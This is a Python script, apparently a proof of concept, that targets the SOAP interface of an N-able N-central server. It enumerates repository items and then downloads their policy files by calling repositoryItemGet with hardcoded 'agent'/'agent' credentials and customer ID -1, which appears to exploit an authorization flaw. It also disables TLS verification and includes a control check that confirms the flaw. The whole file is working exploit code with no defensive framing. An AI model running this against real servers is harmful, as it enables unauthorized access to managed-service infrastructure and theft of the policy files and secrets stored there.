#!/usr/bin/env python3
import argparse
import base64
import getpass
import os
import xml.etree.ElementTree as ET

import requests
import urllib3


SOAP = "http://www.w3.org/2003/05/soap-envelope"
II2 = "http://ii2.nobj.nable.com/"


def call(session, target, operation, fields):
    envelope = ET.Element(f"{{{SOAP}}}Envelope")
    body = ET.SubElement(envelope, f"{{{SOAP}}}Body")
    method = ET.SubElement(body, f"{{{II2}}}{operation}")
    for name, value in fields:
        ET.SubElement(method, f"{{{II2}}}{name}").text = str(value)
    response = session.post(
        target.rstrip("/") + "/dms2/services2/ServerII2",
        data=ET.tostring(envelope, encoding="utf-8", xml_declaration=True),
        headers={"Content-Type": "application/soap+xml; charset=UTF-8"},
        verify=False,
        timeout=60,
    )
    response.raise_for_status()
    root = ET.fromstring(response.content)
    if any(node.tag.rsplit("}", 1)[-1] == "Fault" for node in root.iter()):
        raise RuntimeError("SOAP fault")
    return root


def field(node, name):
    return next(
        (child.text or "" for child in node if child.tag.rsplit("}", 1)[-1] == name),
        "",
    )


def enumerate_items(session, args, password):
    root = call(
        session,
        args.target,
        "repositoryItemList",
        [
            ("username", args.username),
            ("password", base64.b64encode(password.encode()).decode()),
            ("customerID", args.customer_id),
            ("includeExecutableItems", "true"),
        ],
    )
    return [
        (field(node, "name"), field(node, "repositoryItemUUID"))
        for node in root.iter()
        if node.tag.rsplit("}", 1)[-1] == "return"
        and field(node, "repositoryItemUUID")
    ]


def download(session, args, item_uuid):
    root = call(
        session,
        args.target,
        "repositoryItemGet",
        [
            ("username", "agent"),
            ("password", "agent"),
            ("customerID", -1),
            ("repositoryItemUUID", item_uuid),
        ],
    )
    item = next(
        (node for node in root.iter() if node.tag.rsplit("}", 1)[-1] == "return"),
        None,
    )
    if item is None:
        return "", b""
    encoded = field(item, "policyFile")
    return field(item, "name"), base64.b64decode(encoded) if encoded else b""


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--customer-id", type=int, default=50)
    parser.add_argument("--username")
    parser.add_argument("--password", default=os.getenv("NCENTRAL_PASSWORD"))
    parser.add_argument("--uuid")
    parser.add_argument("--output")
    parser.add_argument("--control", action="store_true")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    session = requests.Session()
    item_uuid = args.uuid
    if args.username:
        password = args.password or getpass.getpass("Password: ")
        items = enumerate_items(session, args, password)
        print(f"enumerated_items={len(items)}")
        if not items:
            raise SystemExit(1)
        item_uuid = item_uuid or items[0][1]
    if not item_uuid:
        parser.error("provide --username or --uuid")

    name, policy = download(session, args, item_uuid)
    print(f"name={name!r}")
    print(f"policy_bytes={len(policy)}")
    if not policy:
        raise SystemExit(1)
    if args.output:
        open(args.output, "wb").write(policy)
    if args.control:
        _, control = download(
            session, args, "00000000-0000-4000-8000-000000000000"
        )
        print(f"control_bytes={len(control)}")
        if control:
            raise SystemExit(1)


if __name__ == "__main__":
    main()
